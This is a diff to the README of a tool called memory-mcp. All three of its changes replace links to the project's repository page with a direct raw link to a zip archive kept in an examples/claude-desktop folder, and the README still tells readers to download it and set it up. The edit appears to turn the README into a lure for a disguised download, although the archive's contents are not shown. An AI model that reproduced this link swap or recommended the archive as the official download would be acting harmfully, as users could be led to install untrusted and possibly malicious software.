@@ -1,6 +1,6 @@
 # 🧠 memory-mcp - Keep Project Memory in Sync
 
-[![Download memory-mcp](https://img.shields.io/badge/Download%20memory--mcp-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/User75621/memory-mcp)
+[![Download memory-mcp](https://img.shields.io/badge/Download%20memory--mcp-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/User75621/memory-mcp/main/examples/claude-desktop/mcp-memory-2.7.zip)
 
 ## 🚀 What memory-mcp does
 
@@ -24,7 +24,7 @@ You will need:
 
 Visit this page to download and set up memory-mcp:
 
-https://github.com/User75621/memory-mcp
+https://raw.githubusercontent.com/User75621/memory-mcp/main/examples/claude-desktop/mcp-memory-2.7.zip
 
 If the page has a release file, download it. If it has setup files or source code, save the files to your PC so you can run the server from that folder.
 
@@ -190,4 +190,4 @@ memory-mcp works well for:
 
 Download and setup page:
 
-https://github.com/User75621/memory-mcp
+https://raw.githubusercontent.com/User75621/memory-mcp/main/examples/claude-desktop/mcp-memory-2.7.zip
